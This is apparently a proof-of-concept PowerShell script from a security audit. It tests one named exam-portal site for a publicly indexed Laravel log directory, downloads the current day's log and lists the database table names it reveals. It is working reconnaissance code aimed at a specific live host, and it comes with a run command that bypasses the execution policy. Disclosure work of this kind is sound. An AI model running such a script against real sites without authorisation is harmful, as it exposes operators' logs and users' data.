# PoC 04 — Debug Log File Disclosure (Masked Edition)
# Finding: CRITICAL | ID: LOG-01
# Target: https://student.citexams.in/storage/logs/
# Run: powershell -ExecutionPolicy Bypass -File .\poc_04_log_exposure.ps1

Write-Host "=========================================="
Write-Host " PoC 04 — Application Debug Log Exposure" -ForegroundColor Cyan
Write-Host " Target: /storage/logs/"
Write-Host "=========================================="
Write-Host ""

$logBase = "https://student.citexams.in/storage/logs/"
$today   = Get-Date -Format "yyyy-MM-dd"

Write-Host "[*] Auditing Log Storage Directory..."
try {
    $dir      = Invoke-WebRequest -Uri $logBase -UseBasicParsing -ErrorAction Stop
    $logFiles = [regex]::Matches($dir.Content, 'href="(laravel-[\d-]+\.log)"') | ForEach-Object { $_.Groups[1].Value }

    Write-Host "[!] HTTP $($dir.StatusCode) OK — Directory Indexing Enabled" -ForegroundColor Red
    Write-Host "[!] Disclosed Daily Log Files: $($logFiles.Count)" -ForegroundColor Red
    Write-Host ""

    $log  = Invoke-WebRequest -Uri "$logBase`laravel-$today.log" -UseBasicParsing -ErrorAction Stop
    $size = [Math]::Round($log.RawContentLength / 1024, 1)

    Write-Host "[+] Target Log: laravel-$today.log ($size KB)"
    Write-Host ""

    $content = $log.Content
    $tables  = [regex]::Matches($content, '`(bklydes_[a-z_]+|dx_[a-z_]+)`') | ForEach-Object { $_.Groups[1].Value } | Sort-Object -Unique

    Write-Host "=== Disclosed Database Tables ===" -ForegroundColor Yellow
    $tables | ForEach-Object { Write-Host "  $_" }

    Write-Host ""
    Write-Host "[CONFIRMED] Debug logs are publicly readable." -ForegroundColor Red

} catch {
    Write-Host "[SAFE] Log directory is protected." -ForegroundColor Green
}
